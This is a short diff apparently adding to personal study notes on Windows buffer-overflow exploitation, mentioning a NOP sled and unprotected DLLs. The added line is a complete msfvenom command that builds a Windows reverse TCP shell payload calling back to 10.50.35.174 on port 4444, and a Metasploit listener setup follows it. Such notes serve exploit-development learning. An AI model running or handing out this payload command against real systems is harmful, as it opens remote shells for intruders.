@@ -19,6 +19,7 @@ use a dll with no protections
 *****NOP SLED*****
 
 msfvenom for reverse shell
+msfvenom -p windows/shell/reverse_tcp lhost=10.50.35.174 lport=4444 -b "\x00" -f python
 
 msfconsole:
 use multi/handler
